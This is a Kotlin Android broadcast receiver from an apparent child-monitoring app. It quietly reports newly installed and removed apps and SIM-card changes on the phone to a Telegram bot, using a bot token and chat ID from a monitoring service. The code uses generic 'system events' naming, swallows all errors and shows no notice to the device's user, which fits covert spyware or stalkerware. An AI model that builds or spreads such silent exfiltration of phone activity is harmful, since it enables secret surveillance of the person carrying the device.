package com.coc338781.childapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class SystemEventsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SysEvents"
        private const val PREF = "sys_events"
        private const val KEY_LAST_SIM = "last_sim"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onReceive(context: Context, intent: Intent) {
        try {
            when (intent.action) {
                Intent.ACTION_PACKAGE_ADDED -> {
                    if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
                    val pkg = intent.data?.schemeSpecificPart ?: return
                    if (pkg == context.packageName) return
                    val appName = getAppName(context, pkg)
                    notifyTelegram(context, "📦 NEW APP INSTALLED\n\n📱 $appName\n🔗 $pkg")
                }
                Intent.ACTION_PACKAGE_REMOVED -> {
                    if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
                    val pkg = intent.data?.schemeSpecificPart ?: return
                    if (pkg == context.packageName) return
                    notifyTelegram(context, "🗑 APP UNINSTALLED\n\n🔗 $pkg")
                }
                "android.intent.action.SIM_STATE_CHANGED" -> {
                    handleSimChange(context)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error", e)
        }
    }

    private fun getAppName(context: Context, pkg: String): String {
        return try {
            val pm = context.packageManager
            val info = if (Build.VERSION.SDK_INT >= 33)
                pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
            else
                @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Exception) { pkg }
    }

    private fun handleSimChange(context: Context) {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val operator = tm.networkOperatorName ?: "Unknown"
            val simState = tm.simState

            // Only notify if state is READY
            if (simState != TelephonyManager.SIM_STATE_READY) return

            val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            val lastOperator = prefs.getString(KEY_LAST_SIM, "")

            if (lastOperator.isNotEmpty() && lastOperator != operator) {
                notifyTelegram(context, "⚠️ SIM CHANGED!\n\n📡 Old: $lastOperator\n📡 New: $operator")
            }
            prefs.edit().putString(KEY_LAST_SIM, operator).apply()
        } catch (_: Exception) {}
    }

    private fun notifyTelegram(context: Context, msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", MonitoringService.CHAT_ID)
                    put("text", msg)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }
}
